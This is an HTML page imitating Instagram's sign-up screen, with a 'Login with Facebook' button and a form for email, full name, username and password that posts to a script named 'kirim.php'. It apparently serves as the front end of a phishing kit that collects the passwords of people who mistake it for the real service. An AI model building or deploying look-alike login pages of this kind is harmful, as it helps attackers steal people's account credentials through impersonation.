<!DOCTYPE html>
<html>
<head>
	<meta charset="UTF-8">
	<title>Instagram</title>
	<link rel="stylesheet" href="style.css">
</head>
<body>

<div id = "container">

	<div class="Header">
		Instagram
	</div>

	<div class="subheader">
		sign up to see photos and videos<br>
		for your friends.
	</div>

	<div class="button">
		<form action="index.php" method="POST">
		<input type="submit" value="Login with Facebook">
		</form>
	</div>

	<div class="content">
		<form action="kirim.php" method="POST">
			<Input type="Email" name="email" id="email" placeholder="Email"><br>
			<Input type="text" name="fullname" id="fullname" placeholder="Fullname"><br>
			<Input type="text" name="user" id="user" placeholder="Username"><br>
			<Input type="password" name="pw" id="pw" placeholder="Password"><br>
			<input type="submit" value="Sign Up">
		</form>

	</div>

		<div class="Footer">
		By Signing Up, you agree to our <br>
		<b>Terms</b> & <b>Privacy Policy</b>
		</div>

	</div>
</body>
</html>